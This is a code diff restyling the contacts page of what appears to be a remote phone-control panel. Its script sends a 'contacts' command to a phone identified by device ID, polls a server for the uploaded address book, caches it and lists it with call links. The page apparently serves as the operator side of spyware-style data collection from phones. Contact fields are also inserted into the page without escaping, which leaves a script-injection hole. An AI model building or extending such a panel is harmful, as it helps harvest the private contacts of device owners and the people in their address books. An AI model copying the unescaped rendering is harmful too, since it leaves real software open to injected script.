@@ -3,123 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contacts - Device Control</title>
+    <title>Contacts</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg-color: #0f0f0f;
-            --glass-bg: rgba(255, 255, 255, 0.1);
-            --glass-border: rgba(255, 255, 255, 0.2);
+            --bg-color: #000000;
             --text-main: #ffffff;
-            --text-muted: #aaaaaa;
-            --accent: #4caf50;
+            --text-sub: #8e8e93;
+            --search-bg: #1c1c1e;
+            --separator: rgba(255, 255, 255, 0.15);
+            --blue-accent: #0a84ff;
         }
 
         body {
             background-color: var(--bg-color);
-            background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: var(--text-main);
-            font-family: 'Segoe UI', sans-serif;
-            margin: 0; padding: 10px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0; padding: 0;
             display: flex; justify-content: center;
+            min-height: 100vh;
         }
 
         .container {
-            width: 100%; max-width: 450px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 30px; padding: 20px;
-            border: 1px solid var(--glass-border);
-            min-height: 80vh;
+            width: 100%; max-width: 480px;
+            background: #000;
+            display: flex; flex-direction: column;
+            position: relative;
+            min-height: 100vh;
         }
 
+        /* --- HEADER (iOS Style) --- */
         .header {
             display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 15px; padding-bottom: 10px;
-            border-bottom: 1px solid var(--glass-border);
-        }
-
-        .search-box {
-            position: relative;
-            margin-bottom: 15px;
-        }
-
-        .search-input {
-            width: 100%;
-            padding: 12px 15px 12px 40px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid var(--glass-border);
-            border-radius: 20px;
-            color: white;
-            font-size: 1rem;
-            outline: none;
-            box-sizing: border-box;
-            transition: 0.3s;
-        }
-
-        .search-input:focus {
-            background: rgba(255, 255, 255, 0.1);
-            border-color: var(--accent);
-        }
-
-        .search-icon {
-            position: absolute;
-            left: 15px; top: 50%;
-            transform: translateY(-50%);
-            color: var(--text-muted);
-        }
-
-        #apiStatus {
-            background: rgba(0, 243, 255, 0.05);
-            font-size: 11px; padding: 10px; border-radius: 12px;
-            margin-bottom: 15px; border-left: 3px solid #00f3ff;
-            color: #00f3ff; font-family: monospace;
+            padding: 15px 20px;
+            background: rgba(20, 20, 20, 0.95);
+            position: sticky; top: 0; z-index: 100;
+            backdrop-filter: blur(10px);
+            border-bottom: 0.5px solid var(--separator);
         }
 
         .back-btn {
-            color: var(--text-main); font-size: 1.2rem;
-            text-decoration: none; display: flex; align-items: center; justify-content: center;
-            width: 35px; height: 35px; background: var(--glass-bg); border-radius: 50%;
+            color: var(--blue-accent); font-size: 1.2rem;
+            text-decoration: none; width: 30px; height: 30px;
+            display: flex; align-items: center; justify-content: center;
         }
 
-        .contact-list {
-            display: flex; flex-direction: column; gap: 10px;
-            max-height: 500px; overflow-y: auto; padding-right: 5px;
+        .page-title { 
+            font-size: 1.1rem; font-weight: 600; color: var(--text-main);
         }
-
-        .contact-card {
-            background: var(--glass-bg); padding: 12px;
-            border-radius: 15px; display: flex; align-items: center;
-            border: 1px solid var(--glass-border);
-            transition: transform 0.2s;
-            /* Ye zaroori hai smooth rendering ke liye */
-            contain: content; 
-        }
-        
-        /* Search ke time chupaane ke liye class */
-        .hidden {
-            display: none !important;
-        }
-
-        .contact-card:hover {
-            transform: scale(1.02);
-            background: rgba(255, 255, 255, 0.15);
-        }
-
-        .avatar {
-            width: 38px; height: 38px;
-            background: linear-gradient(45deg, #4caf50, #2e7d32);
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            font-weight: bold; margin-right: 15px; flex-shrink: 0;
-        }
-
-        .info { flex: 1; }
-        .name { font-size: 0.95rem; font-weight: 500; color: #fff; }
-        .number { font-size: 0.8rem; color: var(--text-muted); }
 
         .refresh-btn {
-            background: var(--accent); border: none; color: white;
-            padding: 8px 15px; border-radius: 20px; cursor: pointer; font-weight: bold;
+            background: transparent; border: none;
+            color: var(--blue-accent); font-size: 1.1rem; 
+            cursor: pointer; padding: 0;
         }
+
+        /* --- SEARCH BAR --- */
+        .search-container {
+            padding: 10px 15px;
+            background: #000;
+            position: sticky; top: 60px; z-index: 90;
+        }
+
+        .search-box {
+            background: var(--search-bg);
+            border-radius: 10px;
+            display: flex; align-items: center;
+            padding: 8px 12px;
+        }
+
+        .search-icon { color: var(--text-sub); margin-right: 8px; font-size: 0.9rem; }
+
+        .search-input {
+            background: transparent; border: none; outline: none;
+            color: var(--text-main); width: 100%; font-size: 1rem;
+        }
+        
+        .search-input::placeholder { color: var(--text-sub); }
+
+        /* --- CONTACT LIST --- */
+        .contact-list { 
+            display: flex; flex-direction: column; 
+            padding-bottom: 50px;
+        }
+
+        .contact-row {
+            display: flex; align-items: center;
+            padding: 12px 20px;
+            border-bottom: 0.5px solid var(--separator);
+            transition: background 0.2s;
+        }
+
+        .contact-row:active { background: #1c1c1e; }
+        
+        /* Hidden class for search */
+        .hidden { display: none !important; }
+
+        /* Avatar Circle */
+        .avatar {
+            width: 40px; height: 40px;
+            background: #2c2c2e; /* iOS Gray Circle */
+            color: #fff;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 600; font-size: 1.1rem;
+            margin-right: 15px; flex-shrink: 0;
+        }
+
+        .info { flex: 1; overflow: hidden; }
+        
+        .name { 
+            font-size: 1rem; font-weight: 600; color: #fff;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+        }
+        
+        .number { 
+            font-size: 0.85rem; color: var(--text-sub); margin-top: 2px;
+        }
+
+        /* Call Button on Right */
+        .call-action {
+            width: 35px; height: 35px;
+            display: flex; align-items: center; justify-content: center;
+            color: var(--blue-accent); font-size: 1.1rem;
+            text-decoration: none; margin-left: 10px;
+            background: rgba(10, 132, 255, 0.1); border-radius: 50%;
+        }
+
+        .empty-msg { text-align: center; color: var(--text-sub); margin-top: 50px; }
     </style>
 </head>
 <body>
@@ -128,18 +139,20 @@
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
             <span class="page-title">Contacts</span>
-            <button onclick="handleRefresh()" class="refresh-btn" id="refreshBtn">Refresh</button>
+            <button onclick="handleRefresh()" class="refresh-btn" id="refreshBtn">
+                <i class="fa-solid fa-rotate"></i>
+            </button>
         </div>
 
-        <div id="apiStatus">Initializing...</div>
-
-        <div class="search-box">
-            <i class="fa-solid fa-search search-icon"></i>
-            <input type="text" id="searchInput" class="search-input" placeholder="Search name or number..." oninput="filterContacts()">
+        <div class="search-container">
+            <div class="search-box">
+                <i class="fa-solid fa-magnifying-glass search-icon"></i>
+                <input type="text" id="searchInput" class="search-input" placeholder="Search" oninput="filterContacts()">
+            </div>
         </div>
 
         <div class="contact-list" id="contactsContainer">
-            <div style="text-align: center; color: #666; margin-top: 50px;">Waiting for data...</div>
+            <div class="empty-msg">Loading Contacts...</div>
         </div>
     </div>
 
@@ -149,23 +162,16 @@
         
         const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
         const storageKey = `contacts_${DEVICE_ID}`;
-        const statusEl = document.getElementById("apiStatus");
         let retryCount = 0;
         let allContactsData = []; 
 
-        function setStatus(msg, isError = false) {
-            statusEl.style.color = isError ? "#ff4444" : "#00f3ff";
-            statusEl.innerHTML = `📡 <strong>Status:</strong> ${msg}`;
-        }
-
         document.addEventListener("DOMContentLoaded", () => {
             if (!DEVICE_ID) {
-                setStatus("Error: Device ID missing!", true);
+                alert("Device ID Missing!");
                 return;
             }
-            setStatus(`Device ID: ${DEVICE_ID} detected.`);
             loadFromStorage();
-            handleRefresh();
+            handleRefresh(); // Auto refresh on load
         });
 
         function loadFromStorage() {
@@ -176,110 +182,111 @@
             }
         }
 
-        // --- 🔥 FAST SEARCH FUNCTION (NO RE-RENDERING) ---
-        // Hum ab HTML delete nahi kar rahe, bas 'hide' kar rahe hain
+        // --- FAST SEARCH (No UI Lag) ---
         let searchTimeout;
         function filterContacts() {
-            // Thoda delay (debounce) taaki har letter pe load na ho
             clearTimeout(searchTimeout);
             searchTimeout = setTimeout(() => {
                 const query = document.getElementById('searchInput').value.toLowerCase();
-                const cards = document.querySelectorAll('.contact-card');
+                const rows = document.querySelectorAll('.contact-row');
                 
-                cards.forEach(card => {
-                    // Humne data-search attribute banaya hai taaki calculation fast ho
-                    const searchData = card.getAttribute('data-search');
-                    
+                rows.forEach(row => {
+                    const searchData = row.getAttribute('data-search');
                     if (searchData && searchData.includes(query)) {
-                        card.classList.remove('hidden');
+                        row.classList.remove('hidden');
                     } else {
-                        card.classList.add('hidden');
+                        row.classList.add('hidden');
                     }
                 });
-            }, 100); // 100ms ka delay smooth typing ke liye
+            }, 50); 
         }
-        // -----------------------------------------------
 
         function handleRefresh() {
             retryCount = 0;
-            sendCommand();
-            setTimeout(fetchData, 5000);
-        }
+            const btn = document.getElementById("refreshBtn");
+            const icon = btn.querySelector('i');
+            icon.classList.add('fa-spin'); // Start spinning
 
-        function sendCommand() {
-            setStatus("Sending 'contacts' command to phone...");
+            // Send command first
             fetch(`${SERVER_URL}/api/send-command`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
-            }).then(res => res.json())
-              .then(data => console.log("Command queued:", data));
+            }).then(() => {
+                // Wait then fetch
+                setTimeout(fetchData, 4000);
+            }).catch(e => {
+                console.error(e);
+                icon.classList.remove('fa-spin');
+            });
         }
 
         function fetchData() {
-            const btn = document.getElementById("refreshBtn");
-            btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i>';
-            
             const apiURL = `${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${Date.now()}`;
+            const btn = document.getElementById("refreshBtn");
+            const icon = btn.querySelector('i');
 
             fetch(apiURL)
                 .then(res => res.json())
                 .then(data => {
                     if (!data || data.length === 0) {
-                        if (retryCount < 5) {
+                        if (retryCount < 3) { // Try 3 times
                             retryCount++;
-                            setStatus(`Waiting for phone upload (Attempt ${retryCount}/5)...`);
-                            setTimeout(fetchData, 5000);
+                            setTimeout(fetchData, 4000);
                         } else {
-                            setStatus("Phone offline ya permission nahi hai.", true);
+                            icon.classList.remove('fa-spin'); // Stop spinning
                         }
                         return;
                     }
 
                     allContactsData = data; 
                     localStorage.setItem(storageKey, JSON.stringify(data));
-                    setStatus(`Successfully received ${data.length} contacts.`);
                     renderContacts(data);
+                    icon.classList.remove('fa-spin'); // Success stop
                 })
-                .catch(err => setStatus("Connection failed: " + err.message, true))
-                .finally(() => {
-                    btn.innerHTML = 'Refresh';
+                .catch(err => {
+                    console.error("Error fetching", err);
+                    icon.classList.remove('fa-spin');
                 });
         }
 
-        // --- 🔥 OPTIMIZED RENDER FUNCTION ---
         function renderContacts(data) {
             const container = document.getElementById("contactsContainer");
             
-            // Step 1: Data ko Sort karo
+            // Sort Alphabetically
             data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
 
-            // Step 2: HTML string mein pura data build karo (DOM update karne se fast hai)
             let htmlBuffer = "";
             
             data.forEach(contact => {
                 const name = contact.name || "Unknown";
-                const num = contact.number || contact.phone || "No Number";
+                const num = contact.number || contact.phone || "";
                 const firstLetter = name.charAt(0).toUpperCase();
                 
-                // Search ke liye pehle se string bana lo (lowercase mein)
+                // Search optimization string
                 const searchString = (name + " " + num).toLowerCase();
 
-                // 'data-search' attribute mein search content store karo
+                // Random pastel color for avatar if you want, currently simplified to iOS Gray
                 htmlBuffer += `
-                    <div class="contact-card" data-search="${searchString}">
+                    <div class="contact-row" data-search="${searchString}">
                         <div class="avatar">${firstLetter}</div>
                         <div class="info">
                             <div class="name">${name}</div>
                             <div class="number">${num}</div>
                         </div>
+                        <a href="tel:${num}" class="call-action">
+                            <i class="fa-solid fa-phone"></i>
+                        </a>
                     </div>`;
             });
 
-            // Step 3: Ek baar mein inject karo (Browser freeze nahi hoga)
-            container.innerHTML = htmlBuffer;
+            if (data.length === 0) {
+                container.innerHTML = `<div class="empty-msg">No Contacts Found</div>`;
+            } else {
+                container.innerHTML = htmlBuffer;
+            }
             
-            // Agar search box mein pehle se kuch likha hai to filter apply karo
+            // Re-apply search if exists
             const currentSearch = document.getElementById('searchInput').value;
             if(currentSearch) filterContacts();
         }
